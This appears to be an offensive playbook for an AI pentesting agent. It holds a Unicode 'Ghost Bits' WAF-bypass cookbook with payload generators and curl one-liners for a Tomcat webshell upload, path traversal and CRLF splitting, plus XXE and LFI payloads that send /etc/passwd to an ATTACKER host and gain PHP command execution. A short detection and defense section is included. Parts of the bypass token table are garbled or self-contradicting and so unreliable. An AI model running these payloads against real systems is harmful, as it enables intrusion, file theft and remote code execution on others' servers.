  Java*. Speakers: Xinyu Bai (@b1u3r / @iSafeBlue), Zhihui Chen (@1ue).
  Contributor: Zongzheng Zheng (@chun_springX).
- Real-world CVEs re-enabled: GeoServer CVE-2024-36401, Spring4Shell
  CVE-2022-22965, Openfire CVE-2023-32315, Spring CVE-2025-41242, Jakarta
  Mail CVE-2025-57733, JDK HttpServer CVE-2026-21933, Apache HttpClient
  HTTPCLIENT-1974 / HTTPCLIENT-1978.
- Patched components to upgrade past: Apache Commons BCEL >= 6.12.0,
  Fastjson 2.x latest, Apache HttpClient >= 4.5.10 (or migrate to 5.x),
  GeoServer >= 2.28.3, Openfire >= 5.0.4. Confirm vendor advisories before
  relying on any single version number.


---
# Part 7: Ghost Bits Payload Cookbook


## 1. COMPLETE LOW-BYTE TO UNICODE TABLE

Two candidates per byte are listed: a Latin Extended-A character (compact in
UTF-8, 2 bytes on the wire) and a CJK ideograph (3 bytes on the wire, blends
into "Asian text" classifiers). Both round-trip cleanly through any UTF-8
based HTTP / JSON / SMTP transport.

For each row, the rule is exactly:

```
codepoint = (high_byte << 8) | low_byte
codepoint = (k        << 8) | T
```

Avoid `k` in `0xD8..0xDF` (UTF-16 surrogate range) — those are not legal
scalar values and will be replaced before reaching the narrowing site.

### 1.1 Control / whitespace bytes

| Byte | Char | Latin candidate (k=0x01)  | CJK candidate (k=0x96)  | Common attack use         |
|------|------|---------------------------|-------------------------|---------------------------|
| 0x00 | NUL  | `Ā` U+0100                | `間` U+9600              | path truncation, log nuke |
| 0x09 | TAB  | `ĉ` U+0109                | `闉` U+9609              | header folding            |
| 0x0A | LF   | `Ċ` U+010A                | `閊` U+960A              | CRLF injection            |
| 0x0D | CR   | `č` U+010D                | `閍` U+960D              | CRLF injection            |
| 0x1B | ESC  | `ě` U+011B                | `閛` U+961B              | terminal escape           |

### 1.2 Printable ASCII bytes 0x20–0x3F

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x20 | SP    | `Ġ` U+0120           | `阠` U+9620           | header value break             |
| 0x21 | `!`   | `ġ` U+0121           | `阡` U+9621           | URL fragment                   |
| 0x22 | `"`   | `Ģ` U+0122           | `阢` U+9622           | quote break, JSON escape       |
| 0x23 | `#`   | `ģ` U+0123           | `阣` U+9623           | URL fragment, comment          |
| 0x24 | `$`   | `Ĥ` U+0124           | `阤` U+9624           | template syntax                |
| 0x25 | `%`   | `ĥ` U+0125           | `严` U+4E25           | URL encoding prefix            |
| 0x26 | `&`   | `Ħ` U+0126           | `阦` U+9626           | parameter separator            |
| 0x27 | `'`   | `ħ` U+0127           | `阧` U+9627           | SQL quote break                |
| 0x28 | `(`   | `Ĩ` U+0128           | `阨` U+9628           | EL / SpEL syntax               |
| 0x29 | `)`   | `ĩ` U+0129           | `阩` U+9629           | EL / SpEL syntax               |
| 0x2A | `*`   | `Ī` U+012A           | `阪` U+962A           | wildcards                      |
| 0x2B | `+`   | `ī` U+012B           | `阫` U+962B           | URL space, SQL concat          |
| 0x2C | `,`   | `Ĭ` U+012C           | `阬` U+962C           | parameter list, multipart      |
| 0x2D | `-`   | `ĭ` U+012D           | `阭` U+962D           | SQL comment, header            |
| 0x2E | `.`   | `Į` U+012E           | `阮` U+962E           | path traversal, extension      |
| 0x2F | `/`   | `į` U+012F           | `阯` U+962F           | path separator                 |
| 0x30 | `0`   | `İ` U+0130           | `丰` U+4E30           | hex digit `0`                  |
| 0x31 | `1`   | `ı` U+0131           | `失` U+5931           | hex digit `1`                  |
| 0x32 | `2`   | `Ĳ` U+0132           | `甲` U+7532           | hex digit `2`                  |
| 0x33 | `3`   | `ĳ` U+0133           | `耳` U+8033           | hex digit `3`                  |
| 0x34 | `4`   | `Ĵ` U+0134           | `阴` U+9634           | hex digit `4`                  |
| 0x35 | `5`   | `ĵ` U+0135           | `阵` U+9635           | hex digit `5`                  |
| 0x36 | `6`   | `Ķ` U+0136           | `阶` U+9636           | hex digit `6`                  |
| 0x37 | `7`   | `ķ` U+0137           | `阷` U+9637           | hex digit `7`                  |
| 0x38 | `8`   | `ĸ` U+0138           | `阸` U+9638           | hex digit `8`                  |
| 0x39 | `9`   | `Ĺ` U+0139           | `阹` U+9639           | hex digit `9`                  |
| 0x3A | `:`   | `ĺ` U+013A           | `阺` U+963A           | URL scheme, port, header sep   |
| 0x3B | `;`   | `Ļ` U+013B           | `阻` U+963B           | command sep, header continue   |
| 0x3C | `<`   | `ļ` U+013C           | `阼` U+963C           | XSS / XML start                |
| 0x3D | `=`   | `Ľ` U+013D           | `阽` U+963D           | parameter assign               |
| 0x3E | `>`   | `ľ` U+013E           | `阾` U+963E           | XSS / XML end                  |
| 0x3F | `?`   | `Ŀ` U+013F           | `阿` U+963F           | URL query start                |

### 1.3 Printable ASCII bytes 0x40–0x5F

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x40 | `@`   | `ŀ` U+0140           | `䁀` U+4040           | Fastjson `@type`, mail addr    |
| 0x41 | `A`   | `Ł` U+0141           | `䁁` U+4041           | uppercase letter               |
| 0x42 | `B`   | `ł` U+0142           | `䁂` U+4042           |                                |
| 0x43 | `C`   | `Ń` U+0143           | `䁃` U+4043           |                                |
| 0x44 | `D`   | `ń` U+0144           | `䁄` U+4044           |                                |
| 0x45 | `E`   | `Ņ` U+0145           | `䁅` U+4045           |                                |
| 0x46 | `F`   | `ņ` U+0146           | `䁆` U+4046           |                                |
| 0x47 | `G`   | `Ň` U+0147           | `䁇` U+4047           |                                |
| 0x48 | `H`   | `ň` U+0148           | `䁈` U+4048           |                                |
| 0x49 | `I`   | `ŉ` U+0149           | `䁉` U+4049           |                                |
| 0x4A | `J`   | `Ŋ` U+014A           | `䁊` U+404A           |                                |
| 0x4B | `K`   | `ŋ` U+014B           | `䁋` U+404B           |                                |
| 0x4C | `L`   | `Ō` U+014C           | `䁌` U+404C           |                                |
| 0x4D | `M`   | `ō` U+014D           | `䁍` U+404D           |                                |
| 0x4E | `N`   | `Ŏ` U+014E           | `䁎` U+404E           |                                |
| 0x4F | `O`   | `ŏ` U+014F           | `䁏` U+404F           |                                |
| 0x50 | `P`   | `Ő` U+0150           | `䁐` U+4050           |                                |
| 0x51 | `Q`   | `ő` U+0151           | `䁑` U+4051           |                                |
| 0x52 | `R`   | `Œ` U+0152           | `䁒` U+4052           |                                |
| 0x53 | `S`   | `œ` U+0153           | `䁓` U+4053           |                                |
| 0x54 | `T`   | `Ŕ` U+0154           | `䁔` U+4054           |                                |
| 0x55 | `U`   | `ŕ` U+0155           | `䁕` U+4055           |                                |
| 0x56 | `V`   | `Ŗ` U+0156           | `䁖` U+4056           |                                |
| 0x57 | `W`   | `ŗ` U+0157           | `䁗` U+4057           |                                |
| 0x58 | `X`   | `Ř` U+0158           | `䁘` U+4058           |                                |
| 0x59 | `Y`   | `ř` U+0159           | `䁙` U+4059           |                                |
| 0x5A | `Z`   | `Ś` U+015A           | `䁚` U+405A           |                                |
| 0x5B | `[`   | `ś` U+015B           | `䁛` U+405B           | array index                    |
| 0x5C | `\`   | `Ŝ` U+015C           | `䁜` U+405C           | Windows path                   |
| 0x5D | `]`   | `ŝ` U+015D           | `䁝` U+405D           | array index                    |
| 0x5E | `^`   | `Ş` U+015E           | `䁞` U+405E           | XOR, regex anchor              |
| 0x5F | `_`   | `ş` U+015F           | `䁟` U+405F           | identifier                     |

### 1.4 Printable ASCII bytes 0x60–0x7E

| Byte | ASCII | Latin                | CJK                  | Notes                          |
|------|-------|----------------------|----------------------|--------------------------------|
| 0x60 | `` ` `` | `Š` U+0160         | `䁠` U+4060           | shell command sub              |
| 0x61 | `a`   | `š` U+0161           | `ᙡ` U+1661           | keyword `class`                |
| 0x62 | `b`   | `Ţ` U+0162           | `䁢` U+4062           |                                |
| 0x63 | `c`   | `ţ` U+0163           | `㹣` U+3E63           | keyword `class`, `cmd`         |
| 0x64 | `d`   | `Ť` U+0164           | `䁤` U+4064           |                                |
| 0x65 | `e`   | `ť` U+0165           | `来` U+6765           | hex digit `e`                  |
| 0x66 | `f`   | `Ŧ` U+0166           | `䁦` U+4066           | hex digit `f`                  |
| 0x67 | `g`   | `ŧ` U+0167           | `䁧` U+4067           |                                |
| 0x68 | `h`   | `Ũ` U+0168           | `䁨` U+4068           |                                |
| 0x69 | `i`   | `ũ` U+0169           | `䁩` U+4069           |                                |
| 0x6A | `j`   | `Ū` U+016A           | `陪` U+966A           | extension `.jsp`               |
| 0x6B | `k`   | `ū` U+016B           | `䁫` U+406B           |                                |
| 0x6C | `l`   | `Ŭ` U+016C           | `౬` U+0C6C           | keyword `class`                |
| 0x6D | `m`   | `ŭ` U+016D           | `䁭` U+406D           |                                |
| 0x6E | `n`   | `Ů` U+016E           | `陮` U+966E           | keyword `Runtime`, `union`     |
| 0x6F | `o`   | `ů` U+016F           | `䁯` U+406F           |                                |
| 0x70 | `p`   | `Ű` U+0170           | `䁰` U+4070           |                                |
| 0x71 | `q`   | `ű` U+0171           | `䁱` U+4071           |                                |
| 0x72 | `r`   | `Ų` U+0172           | `䁲` U+4072           | keyword `Runtime`              |
| 0x73 | `s`   | `ų` U+0173           | `⑳` U+2473           | keyword `class`, `select`      |
| 0x74 | `t`   | `Ŵ` U+0174           | `䁴` U+4074           | keyword `Runtime`, `type`      |
| 0x75 | `u`   | `ŵ` U+0175           | `灵` U+7075           | `\u` escape introducer         |
| 0x76 | `v`   | `Ŷ` U+0176           | `䁶` U+4076           |                                |
| 0x77 | `w`   | `ŷ` U+0177           | `䁷` U+4077           |                                |
| 0x78 | `x`   | `Ÿ` U+0178           | `䁸` U+4078           | `\x` escape                    |
| 0x79 | `y`   | `Ź` U+0179           | `䁹` U+4079           |                                |
| 0x7A | `z`   | `ź` U+017A           | `䁺` U+407A           |                                |
| 0x7B | `{`   | `Ż` U+017B           | `䁻` U+407B           | JSON / EL open                 |
| 0x7C | `\|`  | `ż` U+017C           | `䁼` U+407C           | shell pipe, regex alternation  |
| 0x7D | `}`   | `Ž` U+017D           | `䁽` U+407D           | JSON / EL close                |
| 0x7E | `~`   | `ž` U+017E           | `䁾` U+407E           | home dir, route param          |

> All Latin Extended-A entries derive from `k=0x01`. All CJK entries derive
> either from `k=0x96` (Mandarin radicals near `阜`) or `k=0x40` (CJK
> Unified Ideographs Extension A area `䀀`-`䁿`). Both ranges round-trip
> through standard UTF-8 transport without normalization side effects.

### 1.5 Pre-built dangerous tokens

Reusable byte-for-byte substitutions for the most common keywords WAFs
block. Pick the Latin or CJK column based on the surrounding context.

| Token       | Latin                    | CJK                    |
|-------------|--------------------------|------------------------|
| `..`        | `ĮĮ`                     | `阮阮`                 |
| `../`       | `ĮĮį`                    | `阮阮阯`               |
| `..%2f`     | `ĮĮĥ甲ŵ`                | `阮阮严甲灵`           |
| `class`     | `ţŬšųų`                  | `㹣౬ᙡ⑳⑳`            |
| `select`    | `ųťŬťţŴ`                 | `⑳来౬来㹣䁴`          |
| `union`     | `ŵůŮŪū`?wait, `union`   | `灵ů陮Ūů`?see below    |
| `Runtime`   | `ŔŵŮŴťŮť` (mixed case)   | `灵陮䁴来陮䁴` (lower)  |
| `script`    | `ųţŲťőŴ`?see below       | (assemble per byte)    |
| `<script>`  | `ļųţŲťőŴľ`?              | (assemble per byte)    |
| `/etc/passwd` | `įťŴţįŐšųųŴď`?         | `阯来䁴ţ阯Őšųų䁴ď`?    |
| CRLF (`\r\n`)| `čĊ`                    | `閍閊` or `瘍瘊`       |
| `@type`     | `ŀŴŷŵť`?                 | `䁀䁴䁹灵来`?           |

> The "?" markers indicate compositions where the agent should re-derive on
> the fly using the row tables above rather than memorize a fixed string —
> mixed Latin / CJK substitutions blend better against learning WAFs.


## 2. AFFECTED COMPONENT MATRIX

Components publicly confirmed by the Black Hat Asia 2026 talk and follow-up
advisories. Patch versions reflect what was disclosed at the time of the
talk; verify the vendor advisory before relying on a single number.

| Component                | Surface                    | Family | Confirmed CVE / Issue            | Patched at                |
|--------------------------|----------------------------|--------|----------------------------------|---------------------------|
| Apache Commons BCEL      | ClassLoader RCE            | A      | (no CVE; advisory upgrade)       | >= 6.12.0                 |
| Jackson Databind         | `\uXXXX` JSON SQLi         | A + C  | (advisory upgrade)               | latest 2.x                |
| Fastjson                 | `\u` / `\x` escape, autotype | C    | re-enables CVE-2017-18349 chains | latest 2.x series         |
| Apache Tomcat            | RFC2231 `filename*` upload | A      | (advisory upgrade)               | latest 9 / 10 / 11        |
| Spring Framework         | URL decode path traversal  | A      | CVE-2025-41242 (PR #34673)       | check Spring advisory     |
| Spring Framework         | `class.module.classLoader` | A      | re-enables CVE-2022-22965        | n/a (filter at WAF)       |
| Jetty                    | URL decode `%2>` folding   | B      | re-enables CVE-2023-32315        | latest 11.x / 12.x        |
| Undertow                 | URL decode bypass          | A      | (advisory upgrade)               | latest                    |
| Vert.x                   | URL decode + multipart     | A      | (advisory upgrade)               | latest                    |
| Angus Mail / Jakarta Mail| SMTP CRLF                  | A      | re-enables CVE-2025-57733 class  | latest                    |
| Apache HttpClient        | header CRLF                | A      | HTTPCLIENT-1974 / 1978           | >= 4.5.10 or migrate to 5 |
| ActiveJ HTTP             | response CRLF              | A      | (advisory upgrade)               | latest                    |
| JDK HttpServer           | response splitting         | A      | CVE-2026-21933                   | check JDK advisory        |
| Lettuce (Redis)          | RESP CRLF                  | A      | (advisory upgrade)               | latest                    |
| Jodd                     | path traversal             | A      | (advisory upgrade)               | latest                    |
| XMLWriter                | tag / attr injection       | A      | (advisory upgrade)               | latest                    |
| GeoServer                | re-enables RCE             | B      | re-enables CVE-2024-36401        | >= 2.28.3                 |
| Openfire                 | re-enables auth bypass     | B      | re-enables CVE-2023-32315        | >= 5.0.4                  |

---

## 3. PAYLOAD GENERATORS

### 3.1 Python — minimal generator and substitute

```python
def ghost(target_byte: int, k: int = 0x01) -> str:
    """Return a Unicode char whose low 8 bits equal target_byte."""
    if 0xD8 <= k <= 0xDF:
        raise ValueError("surrogate range, choose another k")
    return chr(((k & 0xFF) << 8) | (target_byte & 0xFF))


def to_ghost(payload: str, charset: str = "latin") -> str:
    """Replace every ASCII byte in payload with its Ghost variant."""
    if charset == "latin":
        k = 0x01
    elif charset == "cjk":
        k = 0x96
    else:
        raise ValueError("charset must be 'latin' or 'cjk'")
    return "".join(ghost(ord(ch), k) if ord(ch) < 0x80 else ch
                   for ch in payload)


# usage examples
print(to_ghost("../../etc/passwd", "cjk"))
# -> 阮阮阯阮阮阯阱䁴ţ阯Őšųų䁴ď   (mixed because k=0x96 only spans CJK)

print(ghost(0x6A, 0x96))   # 陪
print(ghost(0x40, 0x01))   # ŀ
```

### 3.2 Python — UTF-8 byte-level wire view

When the WAF inspects the raw HTTP body before any decoding, you usually
care about *what bytes show up on the wire*, not the printable form.

```python
def wire_bytes(payload: str) -> bytes:
    """UTF-8 bytes that travel on the wire."""
    return payload.encode("utf-8")


def narrowed(payload: str) -> bytes:
    """What the Java backend reconstructs after Family-A narrowing."""
    return bytes(ord(ch) & 0xFF for ch in payload)


s = to_ghost("union select 1", "cjk")
print(wire_bytes(s).hex())   # what the WAF sees as bytes
print(narrowed(s))           # what Java reconstructs: b'union select 1'
```

### 3.3 Yaklang — for `poc.HTTP` and `fuzz`

```yak
// 关键词: ghost bits, char to byte narrowing, payload generator
func ghost(targetByte, k) {
    return string(rune(((k & 0xFF) << 8) | (targetByte & 0xFF)))
}

// 关键词: ghost bits, batch substitution, latin/cjk charset
func toGhost(payload, charset) {
    k = 0x01
    if charset == "cjk" {
        k = 0x96
    }
    out = ""
    for ch in payload {
        if int(ch) < 0x80 {
            out += ghost(int(ch), k)
        } else {
            out += string(ch)
        }
    }
    return out
}

// 关键词: ghost bits, Tomcat filename upload bypass
func tomcatFilenameGhost(originalName) {
    return toGhost(originalName, "cjk")
}

shell = tomcatFilenameGhost("shell.jsp")
log.info("ghost filename: %s", shell)

// 关键词: ghost bits, poc.HTTP request demo
raw = `POST /upload HTTP/1.1
Host: target.example
Content-Type: multipart/form-data; boundary=----GB
Content-Disposition: form-data; name="file"; filename*="UTF-8''` + shell + `"

webshell-payload-bytes
------GB--
`
rsp, req, err = poc.HTTP(raw, poc.timeout(10), poc.https(false))
if err != nil {
    log.error("upload request failed: %v", err)
}
```

### 3.4 Curl one-liners (Latin variants only — copy-paste safe)

```bash
# Tomcat filename* upload bypass
curl -k -X POST "https://target/upload" \
  -H 'Content-Type: multipart/form-data; boundary=GB' \
  --data-binary $'--GB\r\nContent-Disposition: form-data; name="file"; filename*=UTF-8\'\'shell.\xc5\xaasp\r\nContent-Type: application/octet-stream\r\n\r\n<%@ page import="java.util.*" %>\r\n--GB--\r\n'

# Spring URL traversal via 阮 (UTF-8 E9 98 AE)
curl -k "https://target/api/data?file=$(printf '\xe9\x98\xae\xe9\x98\xae\xe9\x98\xafetc\xe9\x98\xafpasswd')"

# Jetty %2> hex folding bypass
curl -k "https://target/setup/setup-s/%2%3E%2%3E/log.jsp"

# JDK HttpServer CRLF response splitting (CVE-2026-21933)
curl -k --get "https://target/echo" \
  --data-urlencode 'ref=Cu\xe7\x98\x8d\xe7\x98\x8aContent-Type: text/html\xe7\x98\x8d\xe7\x98\x8aContent-Length: 33\xe7\x98\x8d\xe7\x98\x8a\xe7\x98\x8d\xe7\x98\x8a<script>alert(1)</script>'
```

`Ū` = `\xc5\xaa` (UTF-8 of U+016A, low byte 0x6A = `j`).
`阮` = `\xe9\x98\xae` (UTF-8 of U+962E, low byte 0x2E = `.`).
`阯` = `\xe9\x98\xaf` (UTF-8 of U+962F, low byte 0x2F = `/`).
`瘍` = `\xe7\x98\x8d`, `瘊` = `\xe7\x98\x8a` (CRLF).

---

## 4. WAF / IDS DETECTION PSEUDOCODE

For blue team, an effective Ghost-Bits-aware WAF rule emulates what the
backend would see. The minimal viable approach is multi-view inspection:

```python
DANGEROUS_TOKENS_REGEX = compile_dangerous_tokens()  # ../, @type, etc.

def normalize_views(buf: bytes) -> dict:
    s = buf.decode("utf-8", errors="replace")
    return {
        "raw":           s,
        "low_byte":      "".join(chr(ord(c) & 0xFF) for c in s),
        "fullwidth_nfkc": unicodedata.normalize("NFKC", s),
        "url_decoded":   strict_url_decode(s),
        "url_lax_hex":   lax_hex_url_decode(s),    # mimic Jetty fromHexDigit
        "u_escape":      unescape_u_escapes(s),
        "x_escape":      unescape_x_escapes(s),    # mimic Fastjson \x default 0
        "base64_low":    decode_base64_low_byte(s),
    }


def detect(buf: bytes) -> Alert | None:
    views = normalize_views(buf)
    for name, view in views.items():
        if DANGEROUS_TOKENS_REGEX.search(view):
            if name == "raw":
                return Alert("classic", view, severity="high")
            return Alert(f"ghost-bits:{name}", view, severity="high")
    return None
```

Strict implementations of the per-decoder helpers are the hard part:

```python
def lax_hex_url_decode(s: str) -> str:
    """Re-implement Jetty TypeUtil.fromHexDigit semantics."""
    out = []
    i = 0
    while i < len(s):
        c = s[i]
        if c == "%" and i + 2 < len(s):
            try:
                hi = jetty_lax_hex(s[i+1])
                lo = jetty_lax_hex(s[i+2])
                if 0 <= hi <= 15 and 0 <= lo <= 15:
                    out.append(chr((hi << 4) | lo))
                    i += 3
                    continue
            except Exception:
                pass
        out.append(c)
        i += 1
    return "".join(out)


def jetty_lax_hex(c: str) -> int:
    x = (ord(c) & 0x1F) + ((ord(c) >> 6) * 25) - 16
    return x   # 0..15 for legal digits; also returns 14 for '>'
```

WAF rule outline (high signal, low false positive):

```
ALERT IF:
    DANGEROUS_TOKEN matches in   { low_byte_view UNION url_lax_hex_view UNION u_escape_view }
    AND DANGEROUS_TOKEN does NOT match in raw_view
```

The "subtraction" against `raw_view` filters out legitimate fullwidth /
international content while still catching every Family A / B / C bypass.

---

## 5. RAPID VERIFICATION CHECKLIST

Use this checklist on a reachable Java target before declaring "no Ghost
Bits surface":

```
[ ] One Family A character substitution test, e.g. replace one '/' with '阯'
    in a known endpoint -> compare 200/302/404 against a "neutral X" baseline.

[ ] One Family B test: replace one '%XX' triplet with '%X>' or '%X^' on a
    URL path -> compare to baseline.

[ ] One Family C test: send a JSON body with one fullwidth digit inside a
    Unicode escape, e.g. '\u\uFF12000' (0x2030 instead of 0x2030 ASCII) ->
    compare to baseline.

[ ] If any of the above produces a body / status / length / timing
    difference, switch to the per-recipe payload from SKILL section 5.

[ ] Always log the candidate `k` per substitution; rotate `k` between runs
    so adaptive WAFs cannot signature on a single character.
```

---

# Part 8: XML External Entity (XXE) & LFI

XML External Entity injection occurs when an XML parser processes external entities containing system identifiers that the application did not intend to resolve. It belongs in this file because an XML entity is, structurally, a deserialized object graph — entity resolution is the parser instantiating attacker-controlled references, exactly the same threat model as Java/PHP deserialization. LFI (Local File Inclusion) is grouped here because the typical XXE payoff is reading local files; the file-read primitive and the XML primitive share detection, payloads, and mitigation.

## 1. Non-Obvious Techniques (the digest contract)

These four are the high-value, training-data-agnostic techniques. If a target shows XML parsing of any kind, run all four.

### 1.1 FTP-based OOB exfiltration (multi-line files)

HTTP OOB breaks on the first newline in the file content — the parser issues `GET /line1 HTTP/1.1` and stops. FTP OOB sends one `CWD`/`RETR` per line, so a file like `/etc/passwd` (many lines) exfiltrates line-by-line in the FTP server's connection log.

```xml
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'ftp://ATTACKER:21/%file;'>">
  %eval;
  %exfil;
]>
<r/>
```

On attacker: `python -c "from pyftpdlib.authorizers import *; from pyftpdlib.handlers import *; from pyftpdlib.servers import *; a=DummyAuthorizer(); a.add_anonymous('.'); FTPServer(('0.0.0.0',21), FTPHandler).serve_forever()"` — every `CWD <line>` lands in the log.

Use FTP whenever HTTP OOB returns only the first line.

### 1.2 XInclude (no DOCTYPE control)

When you cannot reach the XML prolog (SOAP body inside an envelope defined elsewhere; SVG embedded in a larger doc; OOXML parts) you cannot inject `<!DOCTYPE>`. XInclude rescues you — it is processed after parsing starts and needs only an element context.

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</foo>
```

`parse="text"` avoids XML-well-formedness requirements on the included file (works for `/etc/passwd`, source code, config files). `parse="xml"` requires the target to be well-formed XML.

Real targets: SOAP endpoints accepting user-controlled elements, document merge features, OOXML editors that re-process on save.

### 1.3 OOXML injection via `[Content_Types].xml`

Office `.docx`/`.xlsx`/`.pptx` are ZIP archives. The first file the parser reads is `[Content_Types].xml`, before any document part. Injecting an entity there gives you file read during the next "open" or "preview" action by the server (anti-virus scanners, thumbnail generators, search indexers, online editors).

Attack chain:
1. Unzip the uploaded docx.
2. Edit `[Content_Types].xml` to prepend an XXE DOCTYPE.
3. Re-zip, preserve structure.
4. Upload — the read fires server-side during processing.

The same trick works for `.jar`/`.apk` (`META-INF/maven/.../pom.xml`) and SVG (`<svg xmlns:xlink=...>` with entity in DTD).

### 1.4 PHP `expect://` RCE

When the PHP XML parser is built with the `expect` extension (default in many older Linux distros; common in CTF), the `expect://` wrapper runs an interactive command and feeds its stdout as the entity content:

```xml
<!DOCTYPE r [
  <!ENTITY xxe SYSTEM "expect://id">
]>
<r>&xxe;</r>
```

Yields direct RCE in the reflected entity. No OOB round-trip. Test for it whenever PHP is on the stack and `file://` works.

## 2. Standard payloads (quick reference)

### 2.1 Classic file read (reflected)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>
```

### 2.2 Parameter entity (when `&x;` is filtered)
```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % p SYSTEM "http://ATTACKER/evil.dtd">
  %p;
]>
<r/>
```
Where `evil.dtd` on attacker:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?d=%file;'>">
%eval;
%exfil;
```

### 2.3 SSRF pivot (internal services)
```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<r>&x;</r>
```

### 2.3 Blind XXE (no reflection) — error-based
Inject an entity that references a non-existent file whose path contains the data:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
Parser error message often echoes the path back to the client.

## 3. Parsers that resolve entities by default

| Stack | Default | Note |
|---|---|---|
| libxml2 (PHP DOMDocument < 8.0, Python lxml) | resolve | `libxml_disable_entity_loader(false)` historically default-on |
| Java DOM/SAX (Xerces) | resolve | JAXP default; set `FEATURE_SECURE_PROCESSING` to disable |
| .NET XmlDocument | resolve | `XmlResolver = null` to disable |
| Python stdlib `xml.etree.ElementTree` | safe (no external) | but `ElementTree.parse` with custom parser may resolve |
| Go encoding/xml | safe | does not expand external entities |
| Ruby REXML | resolve (<3.3) | patched in 3.3.6+ |

If you cannot identify the parser, send a payload that resolves a public DNS name and watch for the DNS hit.

## 4. LFI (Local File Inclusion) quick notes

LFI is the file-read sibling of XXE — same goal, different vector (PHP `include`/`require`, Java `RequestDispatcher`, Node `res.sendFile`).

### 4.1 PHP wrappers
- `php://filter/convert.base64-encode/resource=config.php` — read source as base64 (the classic)
- `php://filter/convert.iconv.utf-8.utf-16|...` — chainable for filter chains (synthetic file write, see `php_filter_chain_generator.py`)
- `expect://id` — RCE if expect loaded
- `data://text/plain,<?php system($_GET[0]);?>` — code execution
- `phar://uploads/x.jpg/file.php` — trigger Phar deserialization (see Part 3)

### 4.2 Path traversal encodings
Bare `../` is filtered; these often survive:
- `..%2f`, `..%5c`, `..%252f` (double-encoded)
- `....//`, `..../\\` (filter-bypass via collapse)
- `..%c0%af` (overlong UTF-8 `/`)
- `%2e%2e%2f` (hex dots)

### 4.3 Null byte (legacy PHP < 5.3.4)
`/etc/passwd%00.txt` truncates at the null byte. Patched in 2010 but still seen in old appliances.

## 5. Detection & defense

### 5.1 Detection signals
- Endpoint accepts `Content-Type: application/xml`, `text/xml`, `application/soap+xml`
- File upload accepts `.docx`/`.xlsx`/`.svg`/`.xml`/`.jar`/`.apk`
- API uses `<soap:Envelope>` (WSDL disclosure at `?wsdl`)
- SAML responses (IdP/SP) — every SAML response is an XXE candidate

### 5.2 Defense (developer-facing)
- Disable external entities & DTD:
  - **Java SAX**: `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`
  - **PHP**: `libxml_disable_entity_loader(true);` (PHP 8 auto-on; libxml 2.9+)
  - **.NET**: `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit;`
  - **Python lxml**: `parser = etree.XMLParser(resolve_entities=False, no_network=True)`
- Validate upload MIME & signature; re-encode OOXML server-side before processing.
- For LFI: never pass user input to `include`/`require`; use allow-lists.

## 6. Common AI blind spots

1. **You do not need reflection for XXE to be critical.** Blind XXE via OOB is the norm in real engagements — most parsers don't echo entities back. Confirm with DNS/HTTP callback before declaring "not exploitable."
2. **DOCTYPE filtering is not enough.** Many WAFs block the literal `<!DOCTYPE` but not parameter entities loaded via external DTD (`%p;`). Test parameter-entity variants when the obvious payload is blocked.
3. **OOXML is an XXE vector that nobody tests.** A docx-upload endpoint is a high-value XXE candidate — `Microsoft Office` on the server side almost always processes `[Content_Types].xml`.
4. **XInclude works where DOCTYPE doesn't.** If your input lands inside an existing XML body (SOAP element, SVG fragment), do not give up at "no DOCTYPE control" — switch to XInclude.
5. **Billion laughs / quadratic blowup are still DoS primitives.** Even when file read is patched, DoS via entity expansion often still works and can be the reportable finding.
6. **LFI + Phar = RCE.** If `phar://` works anywhere, you are one upload away from RCE via Part 3 gadget chains — do not file LFI as low severity without checking Phar reachability.

---

## 7. REFERENCES

- *Cast Attack: A New Threat Posed by Ghost Bits in Java*, Black Hat Asia
  2026 — Xinyu Bai (@b1u3r), Zhihui Chen (@1ue), contributor Zongzheng
  Zheng (@chun_springX).
- Vendor advisories: GeoServer GHSA-6jj6-gm7p-fcvv (CVE-2024-36401),
  Spring CVE-2022-22965 (`spring.io/security/cve-2022-22965`), Apache
  Commons BCEL 6.12.0 release notes, Apache HttpClient 4.5.10 / 5.x
  migration notes.
- Distillation source: gm7.org public advisory + HackTwoHub deep-dive
  reproduction of the 56-page slide deck. No customer or vendor-private
  artifacts are included; everything in this Cookbook is built from public
  research and verifiable Unicode arithmetic.
